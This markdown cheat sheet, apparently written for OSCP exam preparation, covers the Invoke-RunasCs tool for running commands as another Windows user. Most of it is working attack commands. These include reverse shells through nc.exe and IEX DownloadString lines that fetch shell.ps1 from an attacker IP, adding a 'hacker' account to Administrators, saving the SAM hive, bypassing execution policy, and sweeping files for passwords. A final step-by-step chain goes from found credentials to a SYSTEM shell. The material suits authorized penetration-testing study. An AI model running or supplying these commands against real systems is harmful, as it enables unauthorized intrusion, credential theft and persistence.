---
tags:
  - Windows
  - Privilege_Escalation
  - Lateral_Movement
  - Foundational
---

## Invoke-RunasCs
resources: [RunasCs GitHub](https://github.com/antonioCoco/RunasCs), [Invoke-RunasCs.ps1](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)

> Windows equivalent of Linux `su` command - execute commands as another user with known credentials.

## What is Invoke-RunasCs?

> [!info] Invoke-RunasCs allows you to run commands as a different user on Windows.
> - PowerShell implementation of RunasCs
> - Works when you have credentials but can't use RDP/WinRM
> - Bypasses some restrictions of built-in `runas` command
> - Useful for privilege escalation and lateral movement

## Basic Usage

### Execute Command as Another User
```powershell
Invoke-RunasCs -Username <User> -Password '<Password>' -Command "whoami"
```

**Example:**
```powershell
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "whoami"
```

### Execute Command with Domain
```powershell
Invoke-RunasCs -Username <User> -Password '<Password>' -Domain <Domain> -Command "whoami"
```

**Example:**
```powershell
Invoke-RunasCs -Username admin -Password 'P@ssw0rd' -Domain corp.local -Command "whoami"
```

### Execute PowerShell Script
```powershell
Invoke-RunasCs -Username <User> -Password '<Password>' -Command "powershell.exe -c Get-Process"
```

## Common Use Cases

### Get Reverse Shell as Another User
```powershell
# Generate reverse shell payload
$payload = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"

# Execute as target user
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "powershell.exe -c $payload"
```

### Read Sensitive Files
```powershell
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "type C:\Users\Administrator\Desktop\proof.txt"
```

### Add User to Administrators Group
```powershell
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "net localgroup Administrators hacker /add"
```

### Dump SAM Hashes
```powershell
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "reg save HKLM\SAM C:\Temp\SAM"
```

### Execute Binary
```powershell
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "C:\Temp\nc.exe 10.10.14.5 443 -e cmd.exe"
```

## Advanced Usage

### Execute with Specific Logon Type
```powershell
Invoke-RunasCs -Username <User> -Password '<Password>' -LogonType Interactive -Command "whoami"
```

**Logon Types:**
- `Interactive` (2) - Interactive logon
- `Network` (3) - Network logon
- `Batch` (4) - Batch logon
- `Service` (5) - Service logon
- `NetworkCleartext` (8) - Network logon with cleartext credentials
- `NewCredentials` (9) - New credentials (like runas /netonly)

### Execute with Bypass
```powershell
Invoke-RunasCs -Username <User> -Password '<Password>' -Command "powershell.exe -ExecutionPolicy Bypass -File C:\Temp\script.ps1"
```

### Execute with Output Redirection
```powershell
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "cmd.exe /c dir C:\Users\Administrator\Desktop > C:\Temp\output.txt"
```

## Installation

### Download and Import
```powershell
# Download from GitHub
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1')

# Or download to disk
wget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -O Invoke-RunasCs.ps1
Import-Module .\Invoke-RunasCs.ps1
```

### Load from Kali
```powershell
# Start HTTP server on Kali
python3 -m http.server 80

# Load on Windows
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-RunasCs.ps1')
```

## Comparison with Other Tools

### vs Built-in runas
```cmd
# Built-in runas (requires interactive session)
runas /user:Administrator cmd.exe

# Invoke-RunasCs (works non-interactively)
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "cmd.exe"
```

> [!tip] Invoke-RunasCs works in non-interactive shells where `runas` fails.

### vs PSExec
```bash
# PSExec (requires SMB access)
impacket-psexec Administrator:Password123!@192.168.1.10

# Invoke-RunasCs (works locally)
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "whoami"
```

> [!info] Use Invoke-RunasCs when you're already on the box and have credentials.

### vs Start-Process with Credentials
```powershell
# Start-Process (limited functionality)
$cred = New-Object System.Management.Automation.PSCredential("Administrator", (ConvertTo-SecureString "Password123!" -AsPlainText -Force))
Start-Process cmd.exe -Credential $cred

# Invoke-RunasCs (more flexible)
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "cmd.exe"
```

## Privilege Escalation Workflow

### Step 1: Find Credentials
```powershell
# Search for credentials in files
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

### Step 2: Verify Credentials
```powershell
# Test if credentials work
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "whoami"
```

### Step 3: Get Reverse Shell
```powershell
# Setup listener on Kali
nc -lvnp 443

# Execute reverse shell as Administrator
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "C:\Temp\nc.exe 10.10.14.5 443 -e cmd.exe"
```

### Step 4: Verify Privileges
```cmd
whoami
whoami /priv
whoami /groups
```

## Troubleshooting

### "Access Denied" Error
> [!warning] User doesn't have sufficient privileges or credentials are wrong.

**Solutions:**
- Verify credentials are correct
- Check if user is in Administrators group
- Try different logon type

### "Command Not Found" Error
> [!info] Invoke-RunasCs.ps1 not loaded.

**Solution:**
```powershell
# Reload the script
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-RunasCs.ps1')
```

### Execution Policy Error
```powershell
# Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File Invoke-RunasCs.ps1
```

### Command Doesn't Execute
> [!tip] Try wrapping command in cmd.exe or powershell.exe.

```powershell
# Instead of this
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "whoami"

# Try this
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "cmd.exe /c whoami"
```

## OSCP Exam Tips

> [!important] Invoke-RunasCs is the Windows equivalent of `su` - essential for privilege escalation.

**Time Estimate:** 2-3 minutes to execute commands as another user

**Quick Wins:**
1. **Found credentials in config file** - Use Invoke-RunasCs to escalate
2. **Have user password but no RDP/WinRM** - Get shell with Invoke-RunasCs
3. **Need to execute as SYSTEM** - Combine with other techniques

**Common Mistakes:**
- Forgetting to wrap command in `cmd.exe /c` or `powershell.exe -c`
- Not escaping special characters in password
- Using wrong logon type

**Pro Tips:**
- Always test with `whoami` first
- Use for lateral movement when you have credentials
- Combine with reverse shell for interactive access
- Works when PSExec and WinRM are blocked

## Complete Example

```powershell
# 1. Load Invoke-RunasCs
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-RunasCs.ps1')

# 2. Test credentials
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "whoami"

# 3. Get reverse shell
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"

# 4. Or execute nc.exe
Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command "C:\Temp\nc.exe 10.10.14.5 443 -e cmd.exe"
```

> [!tip] This workflow goes from credentials to SYSTEM shell in under 5 minutes.
